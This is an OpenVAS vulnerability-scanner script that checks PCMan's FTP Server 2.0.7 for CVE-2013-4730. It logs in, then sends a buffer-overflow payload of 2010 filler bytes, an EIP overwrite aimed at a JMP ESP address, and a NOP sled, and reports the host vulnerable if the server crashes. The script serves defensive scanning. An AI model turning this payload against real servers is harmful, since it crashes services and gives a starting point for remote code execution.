###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pcman_ftp_server_mult_vuln.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# PCMan's FTP Server Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803825");
  script_version("$Revision: 13499 $");
  script_cve_id("CVE-2013-4730");
  script_bugtraq_id(65289, 65299);
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-07-02 11:35:46 +0530 (Tue, 02 Jul 2013)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("PCMan's FTP Server Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/26495");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122173/pcman-traversal.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/pcmans-ftp-server-20-denial-of-service");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/pcmans/ftp/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to read or
  write arbitrary files or cause denial of service condition result in loss of
  availability for the application.");

  script_tag(name:"affected", value:"PCMan's FTP Server version 2.0.7");

  script_tag(name:"insight", value:"Improper sanitation of user supplied input via 'PAYLOAD', 'EIP',
  'USER', 'PASS', 'DIR', 'PUT' and 'NOP' parameters.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote host is installed with PCMan's FTP Server and is
  prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
  exit(0);

PAYLOAD = crap(data: "\x41", length:2010);
EIP     = "\xDB\xFC\x1C\x75";  # 751CFCDB   JMP ESP USER32.DLL
NOP     = crap(data: "\x90", length:10);

send(socket:soc, data:string(PAYLOAD, EIP, NOP, '\r\n'));
ftp_close(socket:soc);

soc = open_sock_tcp(ftpPort);
if(!soc){
  security_message(port:ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin){
  security_message(port:ftpPort);
  exit(0);
}